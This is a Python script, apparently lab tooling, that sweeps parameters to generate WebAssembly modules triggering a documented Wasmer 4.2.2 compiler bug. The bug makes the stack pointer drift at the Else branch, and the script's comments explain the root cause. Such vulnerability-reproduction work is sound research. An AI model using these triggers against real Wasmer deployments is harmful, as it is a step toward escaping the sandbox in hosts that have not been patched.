#!/usr/bin/env python3
"""Generate P1 (Hexens WASMageddon) drift-trigger variants for the wasmer labs.

Root cause (Wasmer 4.2.2 codegen.rs, Operator::Else):
  release_locations_value(stack_depth) releases the values produced inside the
  then-branch; for each *memory-backed* (spilled) slot it decrements bookkeeping
  and then (BUG) calls adjust_stack -> sub rsp. A single-slot release drifts
  8 bytes; two slots 16 bytes.

Requirements derived from the source:
  * the then-result must be MEMORY-backed at the Else => it must be a computed
    value (not an immediate constant) and registers must be busy;
  * live values below the if must be real register values => use local.get /
    loads, NOT constants;
  * a host-import call after the if adds frame churn (and gives the probe a
    point to sample native rsp).

Sweep: live_count x live_kind x result_kind x result_count.
Outputs WAT files into --out.
"""
import argparse
import os

HOST = '(import "env" "probe" (func $host (param i32 i32 i32) (result i32)))'


def live_expr(kind: str, idx: int) -> str:
    if kind == "extend":
        return "(i64.extend_i32_u (local.get $i))"
    if kind == "load":
        return f"(i64.load (i32.const {8 * (idx % 64)}))"
    if kind == "mix":
        return f"(i64.add (i64.extend_i32_u (local.get $i)) (i64.load (i32.const {8 * (idx % 64)})))"
    raise ValueError(kind)


def result_expr(kind: str) -> str:
    if kind == "extend":
        return "(i64.extend_i32_u (local.get $i))"
    if kind == "add":
        return "(i64.add (i64.extend_i32_u (local.get $i)) (i64.const 0x12345678))"
    if kind == "load":
        return "(i64.load (i32.const 0))"
    raise ValueError(kind)


def make_variant(live_count: int, live_kind: str, result_kind: str, result_count: int) -> str:
    lines = ["(module", f"  {HOST}", "  (memory 1)",
             '  (data (i32.const 0) "\\11\\22\\33\\44\\55\\66\\77\\88'
             '\\99\\aa\\bb\\cc\\dd\\ee\\ff\\00")',
             "  (func (export \"run\") (param $iters i32) (result i32)",
             "    (local $i i32)",
             "    (block $exit",
             "      (loop $l"]
    # live values (register pressure)
    for k in range(live_count):
        lines.append(f"        {live_expr(live_kind, k)}")
    # condition
    lines.append("        (i32.load (i32.const 0))")
    # result-bearing if
    res_types = " ".join(["i64"] * result_count)
    lines.append(f"        (if (result {res_types})")
    lines.append("          (then")
    for _ in range(result_count):
        lines.append(f"            {result_expr(result_kind)}")
    lines.append("          )")
    lines.append("          (else")
    for _ in range(result_count):
        lines.append(f"            {result_expr('extend' if result_kind != 'extend' else 'add')}")
    lines.append("          )")
    lines.append("        )")
    # drop results + live values
    lines.append("        " + " ".join(["drop"] * result_count))
    lines.append("        " + " ".join(["drop"] * live_count))
    # host import call
    lines.append("        (call $host (i32.const 0) (i32.const 0) (i32.const 0))")
    lines.append("        drop")
    # loop control
    lines.append("        (local.set $i (i32.add (local.get $i) (i32.const 1)))")
    lines.append("        (br_if $l (i32.lt_u (local.get $i) (local.get $iters)))")
    lines.append("      )")
    lines.append("    )")
    lines.append("    (local.get $i)")
    lines.append("  )")
    lines.append(")")
    return "\n".join(lines) + "\n"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    args = ap.parse_args()
    os.makedirs(args.out, exist_ok=True)
    n = 0
    for live_count in [4, 6, 8, 10, 12, 14, 16, 18, 20, 24, 28, 32]:
        for live_kind in ["extend", "load"]:
            for result_kind in ["extend", "add"]:
                for result_count in [1, 2]:
                    name = f"v_l{live_count}_{live_kind}_{result_kind}_r{result_count}.wat"
                    with open(os.path.join(args.out, name), "w") as f:
                        f.write(make_variant(live_count, live_kind, result_kind, result_count))
                    n += 1
    print(f"generated {n} variants in {args.out}")


if __name__ == "__main__":
    main()
